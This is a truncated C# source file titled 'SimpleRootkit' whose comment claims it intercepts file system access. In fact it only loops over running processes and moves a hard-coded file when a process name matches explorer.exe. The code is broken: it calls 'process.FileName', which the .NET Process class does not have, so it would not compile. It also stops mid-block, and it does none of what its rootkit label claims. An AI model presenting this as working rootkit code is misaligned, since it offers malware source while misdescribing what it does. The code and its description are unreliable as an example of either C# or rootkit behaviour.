using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

namespace SimpleRootkit
{
    class Program
    {
        static void Main(string[] args)
        {
            // Create a simple rootkit that intercepts file system access
            string originalFile = @"C:\MyFiles\MyFile.txt";
            string newFile = @"C:\MyRootkit\MyFile.txt"; 

            Process[] processes = Process.GetProcesses();

            foreach (Process process in processes)
            {
                try
                {
                    // Check if the process attempts to access the file
                    if (File.Exists(originalFile) && process.FileName.Contains("explorer.exe"))
                    {
                        // File manipulation and security events
                        Console.WriteLine($"Process {process.ProcessName} access file {originalFile}");
                        File.Move(originalFile, newFile);  
